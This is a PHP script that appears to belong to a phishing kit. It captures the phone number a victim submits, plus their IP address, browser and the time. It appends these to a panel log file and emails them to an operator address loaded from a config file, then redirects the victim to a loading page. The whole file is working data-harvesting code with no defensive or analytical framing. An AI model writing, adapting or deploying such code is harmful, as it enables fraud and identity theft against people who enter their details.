<?php
session_start();
error_reporting(0);
require_once 'os.php'; 
$InfoDATE   = date("d-m-Y h:i:sa");
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
$ip = $_SERVER['REMOTE_ADDR'];

$phone = $_SESSION['phone'] = $_POST['phone'];

$message = '
💸 [Phone] 💸
<br>
Phone Number                         : '.$phone.' 
<br>
💻 [Info] 💻
<br>
IP Address     : '.$_SERVER["REMOTE_ADDR"].' 
<br>
Country     : '.$country.' 
<br>
Browser        : '.$browserTy_Version.' 
<br> 
Time           : '.$InfoDATE.' 
<br>
💸 [Phone] 💸
';

$ff = fopen("../Panel.php", "a");fwrite($ff, $message);
require_once '../config.php';
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "Standard Phone 💸 [".$_SERVER['REMOTE_ADDR']."] ";
$headers .= "From: MRZ" . "\r\n";
mail($yourmail, $subject, $message, $headers);
header("Location: ../app/loading2.php");
